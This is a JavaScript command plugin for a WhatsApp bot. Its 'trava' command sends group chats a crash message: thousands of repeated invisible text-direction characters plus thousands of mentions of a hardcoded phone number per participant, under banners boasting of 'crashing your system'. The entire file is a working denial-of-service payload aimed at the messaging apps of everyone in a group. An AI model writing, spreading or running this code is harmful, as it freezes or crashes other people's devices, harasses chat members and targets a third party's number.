

const handler = async (m, {isOwner, isAdmin, conn, text, participants, args, command, usedPrefix}) => {
  const datas = global
  if (usedPrefix == 'a' || usedPrefix == 'A') return;
  if (!(isAdmin || isOwner)) {
    global.dfail('admin', m, conn);
    throw false;
  }
  const pesan = args.join` `;
  const trava = `48729757881@s.whatsapp.net`
  const oi = `*𝐓𝐑𝐀𝐕𝐀𝐍𝐃𝐎-𝐒𝐄𝐔-𝐒𝐈𝐒𝐓𝐄𝐌𝐀*\n` + `⁧`.repeat(5000) + `\n*𝐁𝐘-𝐃𝐄𝐀𝐓𝐇-𝐇𝐔𝐍𝐓𝐄𝐑*\n`;
  let teks = `*𝐓𝐑𝐀𝐕𝐀𝐍𝐃𝐎-𝐒𝐄𝐔-𝐒𝐈𝐒𝐓𝐄𝐌𝐀*\n` + `⁧`.repeat(5000) + `\n*𝐁𝐘-𝐃𝐄𝐀𝐓𝐇-𝐇𝐔𝐍𝐓𝐄𝐑*\n`;
  for (const mem of participants) {
    teks += `_*@${trava.split('@')[0]}_* `.repeat(4200);
  }
  teks += ` *𝐁𝐘-𝐃𝐄𝐀𝐓𝐇-𝐇𝐔𝐍𝐓𝐄𝐑*`;
  conn.sendMessage(m.chat, {text: teks, mentions: participants.map((a) => a.id)} );
};
handler.help = ['lagga tutti.'];
handler.command = /^(trava)$/i;
handler.owner = true;
export default handler;
